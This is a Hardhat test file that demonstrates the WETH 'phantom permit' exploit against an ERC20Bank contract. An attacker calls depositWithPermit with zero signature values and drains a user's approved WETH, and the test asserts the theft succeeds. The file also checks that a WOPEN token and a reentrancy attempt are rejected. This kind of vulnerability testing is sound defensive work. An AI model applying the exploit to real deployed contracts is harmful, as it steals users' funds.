const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ERC20Bank Exploit Test", function () {
  let baseWETH, wOpen, bankForBaseWETH, bankForWOpen;
  let user, attacker;

  beforeEach(async function () {
    [user, attacker] = await ethers.getSigners();

    // Deploy BaseWETH and ERC20Bank
    const BaseWETH = await ethers.getContractFactory("WETH9");
    baseWETH = await BaseWETH.deploy();
    console.log("Deploying BaseWETH...");
    console.log("BaseWETH target:", await baseWETH.getAddress());

    // Deploy ERC20Bank for BaseWETH
    const ERC20Bank = await ethers.getContractFactory("ERC20Bank");
    bankForBaseWETH = await ERC20Bank.deploy(baseWETH.target);
    console.log("Deploying ERC20Bank for BaseWETH...");
    console.log("ERC20Bank for BaseWETH address:", bankForBaseWETH.target);

    // User deposits into BaseWETH and approves bank
    console.log("Calling deposit on BaseWETH...");
    await baseWETH.connect(user).deposit({ value: ethers.parseEther("100") });
    console.log("Deposit successful");
    
    // Approve bank to spend user's WETH
    await baseWETH.connect(user).approve(await bankForBaseWETH.getAddress(), ethers.MaxUint256);
    
    // User deposits 1 WETH into the bank
    await bankForBaseWETH.connect(user).deposit(ethers.parseEther("1"));
    console.log("User depositing into bank...");
    console.log("User address:", user.address);

    // Deploy WOpen
    const WOpen = await ethers.getContractFactory("WOPEN");
    wOpen = await WOpen.deploy();
    console.log("Deploying WOpen...");
    console.log("WOpen address:", await wOpen.getAddress());

    // Deploy ERC20Bank for WOpen
    bankForWOpen = await ERC20Bank.deploy(wOpen.target);
    console.log("Deploying ERC20Bank for WOpen...");
    console.log("ERC20Bank for WOpen address:", bankForWOpen.target);

    // User also gets some WOpen tokens (if needed for testing)
    // This depends on how WOpen is designed - you might need to call a mint function or similar
    // await wOpen.connect(user).deposit({ value: ethers.parseEther("100") });
  });

  it("BaseWETH should be vulnerable to WETH permit attack", async function () {
    // Get user's remaining WETH balance (should be 99 ETH after depositing 1 ETH to bank)
    const userBalance = await baseWETH.balanceOf(user.address);
    console.log("User WETH balance:", ethers.formatEther(userBalance));

    // Attacker exploits depositWithPermit
    // Note: This assumes the bank contract has a depositWithPermit function that's vulnerable
    await expect(
      bankForBaseWETH.connect(attacker).depositWithPermit(
        user.address,           // owner
        attacker.address,       // spender (attacker)
        userBalance,           // amount
        0,                     // deadline (0 means no deadline check)
        0,                     // v
        ethers.ZeroHash,       // r (using ZeroHash instead of constants.HashZero)
        ethers.ZeroHash        // s
      )
    ).to.not.be.reverted;

    // Get attacker's balance in the bank before withdrawal
    const attackerBankBalance = await bankForBaseWETH.balanceOf(attacker.address);
    console.log("Attacker bank balance:", ethers.formatEther(attackerBankBalance));

    // Attacker withdraws funds from bank
    await bankForBaseWETH.connect(attacker).withdraw(attackerBankBalance);

    // Assert user's WETH balance is drained
    const finalUserBalance = await baseWETH.balanceOf(user.address);
    const finalAttackerBalance = await baseWETH.balanceOf(attacker.address);
    
    console.log("Final user WETH balance:", ethers.formatEther(finalUserBalance));
    console.log("Final attacker WETH balance:", ethers.formatEther(finalAttackerBalance));

    expect(finalUserBalance).to.equal(0);
    // The attacker should have the user's original balance
    expect(finalAttackerBalance).to.equal(userBalance);
  });

  it("WOpen should not be vulnerable to WETH permit attack", async function () {
    // First, ensure user has some WOpen tokens
    const userWOpenBalance = await wOpen.balanceOf(user.address);
    console.log("User WOpen balance:", ethers.formatEther(userWOpenBalance));

    // If user has no WOpen tokens, this test might not be meaningful
    // You might need to give user some WOpen tokens first

    // Attempt exploit on WOpen - this should fail because WOpen does not support permit
    //  reason function selector was not recognized and there's no fallback function
    await expect(
      bankForWOpen.connect(attacker).depositWithPermit(
        user.address,           // owner
        attacker.address,       // spender
        userWOpenBalance,       // amount
        0,                     // deadline
        0,                     // v
        ethers.ZeroHash,       // r
        ethers.ZeroHash        // s
      )
    ).to.be.reverted;


    // Assert user balance remains intact
    expect(await wOpen.balanceOf(user.address)).to.equal(userWOpenBalance);
    expect(await wOpen.balanceOf(attacker.address)).to.equal(0);
  });

  it("Valid depositWithPermit for BaseWETH", async function () {
    const userBalance = await baseWETH.balanceOf(user.address);

    // Attacker uses a valid depositWithPermit
    await bankForBaseWETH.connect(attacker).depositWithPermit(
      user.address,           // owner
      attacker.address,       // spender
      userBalance,           // amount
      Math.floor(Date.now() / 1000) + 3600, // deadline (1 hour from now)
      27,                    // v (example value)
      ethers.ZeroHash, // r
      ethers.ZeroHash  // s
    );

    // Assert attacker balance in the bank
    const attackerBankBalance = await bankForBaseWETH.balanceOf(attacker.address);
    expect(attackerBankBalance).to.equal(userBalance);
  });

  it("Withdraw functionality for WOpen", async function () {
    const depositAmount = ethers.parseEther("10");

    // User deposits WOpen tokens
    await wOpen.connect(user).deposit({ value: depositAmount });

    // User withdraws WOpen tokens
    await wOpen.connect(user).withdraw(depositAmount);

    // Assert user balance is zero
    expect(await wOpen.balanceOf(user.address)).to.equal(0);
  });

  it("Reentrancy prevention in WOpen", async function () {
    const depositAmount = ethers.parseEther("10");

    // Deploy a reentrancy attacker contract
    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await ReentrancyAttacker.deploy(wOpen.target);

    // User deposits WOpen tokens
    await wOpen.connect(user).deposit({ value: depositAmount });

    // Attempt reentrancy attack
    await expect(
      attackerContract.connect(attacker).attack({ value: depositAmount })
    ).to.be.reverted;

    // Assert user balance remains intact
    expect(await wOpen.balanceOf(user.address)).to.equal(depositAmount);
  });
});